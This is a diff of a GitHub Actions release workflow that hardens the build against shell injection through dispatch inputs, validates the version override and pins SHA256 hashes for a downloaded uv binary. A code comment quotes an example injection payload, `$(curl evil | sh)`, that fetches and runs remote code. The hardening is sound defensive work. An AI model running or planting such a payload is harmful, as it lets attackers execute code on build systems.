@@ -33,10 +33,17 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Fail if TOS text or version is placeholder
+        env:
+          # User-controlled workflow inputs pass through $ENV rather
+          # than ${{ ... }} interpolation to block shell injection via
+          # crafted dispatch arguments. See resolve-version step
+          # comments for the full rationale (H1 audit finding).
+          INPUT_ALLOW_PLACEHOLDER: ${{ inputs.allow_placeholder_tos }}
+          DISPATCH_ACTOR: ${{ github.actor }}
         run: |
           set -euo pipefail
-          if [ "${{ inputs.allow_placeholder_tos }}" = "true" ]; then
-            echo "::warning::TOS placeholder guard BYPASSED by ${{ github.actor }}. For dev / internal distribution only. Do NOT ship this build to external users."
+          if [ "$INPUT_ALLOW_PLACEHOLDER" = "true" ]; then
+            echo "::warning::TOS placeholder guard BYPASSED by $DISPATCH_ACTOR. For dev / internal distribution only. Do NOT ship this build to external users."
             exit 0
           fi
           TOS=packages/app/src/components/tos-content.tsx
@@ -120,13 +127,24 @@ jobs:
       - id: version
         env:
           GH_TOKEN: ${{ github.token }}
+          # User-controlled workflow inputs are passed through env, not
+          # interpolated into the shell body with ${{ ... }}. The old
+          # code did `SOURCE="${{ inputs.version_source || 'github' }}"`
+          # etc.; a dispatcher with `actions: write` could set
+          # `inputs.version` to `$(curl evil | sh)` and that string
+          # would reach `bash -e` verbatim. Reading through $ENV inside
+          # the script is literal: the shell never re-evaluates
+          # `$INPUT_VERSION`'s contents as code. (H1 audit finding.)
+          INPUT_VERSION_SOURCE: ${{ inputs.version_source || 'github' }}
+          INPUT_VERSION: ${{ inputs.version }}
+          REPO_SLUG: ${{ github.repository }}
         run: |
           set -euo pipefail
 
           # Always resolve the sidecar (get-physics-done) version from the
           # requested source. This is reported in the release body regardless
           # of whether the desktop version is overridden.
-          SOURCE="${{ inputs.version_source || 'github' }}"
+          SOURCE="$INPUT_VERSION_SOURCE"
           echo "Resolving sidecar version from: $SOURCE"
           case "$SOURCE" in
             pypi)
@@ -137,6 +155,10 @@ jobs:
               ;;
             npm)
               SIDECAR_VERSION=$(curl -s https://registry.npmjs.org/get-physics-done | python3 -c "import sys,json; print(json.load(sys.stdin)['dist-tags']['latest'])")
+              ;;
+            *)
+              echo "::error::unknown version_source: $SOURCE"
+              exit 1
               ;;
           esac
           echo "Sidecar version (get-physics-done): $SIDECAR_VERSION"
@@ -161,9 +183,17 @@ jobs:
           # An explicit inputs.version override uses that value exactly
           # (with the collision loop below handling rare races where a
           # draft was published between resolve and build).
-          REPO="${{ github.repository }}"
-          if [ -n "${{ inputs.version }}" ]; then
-            BASE_VERSION="${{ inputs.version }}"
+          REPO="$REPO_SLUG"
+          if [ -n "$INPUT_VERSION" ]; then
+            # Validate against a strict semver-ish pattern so a mistyped
+            # or attacker-supplied override can't be anything other than
+            # digits and dots. The downstream tag builder assumes a
+            # clean numeric value.
+            if ! printf '%s' "$INPUT_VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
+              echo "::error::inputs.version must be X.Y.Z or X.Y.Z-tag (got: $INPUT_VERSION)"
+              exit 1
+            fi
+            BASE_VERSION="$INPUT_VERSION"
             RESOLVE_SOURCE="manual"
             echo "Desktop version override: $BASE_VERSION"
           else
@@ -318,22 +348,59 @@ jobs:
 
       - name: Download uv binary
         shell: bash
+        env:
+          # Expected SHA256 sums per (UV_VERSION, platform) pinned in
+          # this workflow. If you bump UV_VERSION, regenerate by
+          # fetching each platform's .sha256 file from the astral-sh/uv
+          # release and pasting the hex digest below. Hardcoded (not
+          # fetched-at-build-time) so a compromise of astral-sh's
+          # GitHub or its CDN at the moment of CI can't silently
+          # substitute a backdoored `uv` — a tamper would make CI fail
+          # instead of shipping. Previously: `curl | tar xz` with no
+          # integrity check at all (H2 audit finding).
+          UV_SHA_AARCH64_APPLE_DARWIN: 162b328fc63e0075d4267688201de91356e1c1b81db50419fa4466cfe2dfdebc
+          UV_SHA_X86_64_APPLE_DARWIN: d676940b51bdd5606b218bc2965fed67731f94ad07926045716acbf78626e09b
+          UV_SHA_X86_64_PC_WINDOWS_MSVC: 20d3a420abbf2af9699cd9a02225d9325344046af8deb15563cc451e3c4fd059
+          UV_SHA_X86_64_UNKNOWN_LINUX_GNU: 17fc118ba4d7e9303f84fcabdc0a593fc3480ba76eb6980668fdbbb96fe88562
+          MATRIX_TARGET: ${{ matrix.target }}
+          RUNNER_OS: ${{ runner.os }}
         run: |
+          set -euo pipefail
           UV_VERSION="0.7.3"
-          case "${{ matrix.target }}" in
-            aarch64-apple-darwin)      UV_PLATFORM="aarch64-apple-darwin" ;;
-            x86_64-apple-darwin)       UV_PLATFORM="x86_64-apple-darwin" ;;
-            x86_64-pc-windows-msvc)    UV_PLATFORM="x86_64-pc-windows-msvc" ;;
-            x86_64-unknown-linux-gnu)  UV_PLATFORM="x86_64-unknown-linux-gnu" ;;
+          case "$MATRIX_TARGET" in
+            aarch64-apple-darwin)      UV_PLATFORM="aarch64-apple-darwin"     ; EXPECTED_SHA="$UV_SHA_AARCH64_APPLE_DARWIN" ;;
+            x86_64-apple-darwin)       UV_PLATFORM="x86_64-apple-darwin"      ; EXPECTED_SHA="$UV_SHA_X86_64_APPLE_DARWIN" ;;
+            x86_64-pc-windows-msvc)    UV_PLATFORM="x86_64-pc-windows-msvc"   ; EXPECTED_SHA="$UV_SHA_X86_64_PC_WINDOWS_MSVC" ;;
+            x86_64-unknown-linux-gnu)  UV_PLATFORM="x86_64-unknown-linux-gnu" ; EXPECTED_SHA="$UV_SHA_X86_64_UNKNOWN_LINUX_GNU" ;;
+            *) echo "::error::unknown uv target: $MATRIX_TARGET"; exit 1 ;;
           esac
           mkdir -p packages/desktop/src-tauri/uv-bundle
-          if [ "${{ runner.os }}" = "Windows" ]; then
-            curl -fsSL "https://github.com/astral-sh/uv/releases/download/${UV_VERSION}/uv-${UV_PLATFORM}.zip" -o /tmp/uv.zip
-            unzip /tmp/uv.zip -d packages/desktop/src-tauri/uv-bundle
+          if [ "$RUNNER_OS" = "Windows" ]; then
+            ARCHIVE=/tmp/uv.zip
+            URL="https://github.com/astral-sh/uv/releases/download/${UV_VERSION}/uv-${UV_PLATFORM}.zip"
           else
-            curl -fsSL "https://github.com/astral-sh/uv/releases/download/${UV_VERSION}/uv-${UV_PLATFORM}.tar.gz" \
-              | tar xz -C packages/desktop/src-tauri/uv-bundle --strip-components=1
+            ARCHIVE=/tmp/uv.tar.gz
+            URL="https://github.com/astral-sh/uv/releases/download/${UV_VERSION}/uv-${UV_PLATFORM}.tar.gz"
           fi
+          curl -fsSL "$URL" -o "$ARCHIVE"
+          # Verify BEFORE extract so a bad archive never touches the
+          # build tree. shasum is available on macOS + Git Bash +
+          # Ubuntu-latest runners; no extra installs required.
+          ACTUAL_SHA=$(shasum -a 256 "$ARCHIVE" | cut -d' ' -f1)
+          if [ "$ACTUAL_SHA" != "$EXPECTED_SHA" ]; then
+            echo "::error::uv binary hash mismatch for $UV_PLATFORM"
+            echo "::error::expected: $EXPECTED_SHA"
+            echo "::error::actual:   $ACTUAL_SHA"
+            echo "::error::refusing to ship a tampered or unpinned uv binary"
+            exit 1
+          fi
+          echo "uv sha256 ok ($ACTUAL_SHA)"
+          if [ "$RUNNER_OS" = "Windows" ]; then
+            unzip "$ARCHIVE" -d packages/desktop/src-tauri/uv-bundle
+          else
+            tar xz -C packages/desktop/src-tauri/uv-bundle --strip-components=1 < "$ARCHIVE"
+          fi
+          rm -f "$ARCHIVE"
           chmod +x packages/desktop/src-tauri/uv-bundle/uv 2>/dev/null || true
           echo "uv binary staged: $(du -sh packages/desktop/src-tauri/uv-bundle | cut -f1)"
 
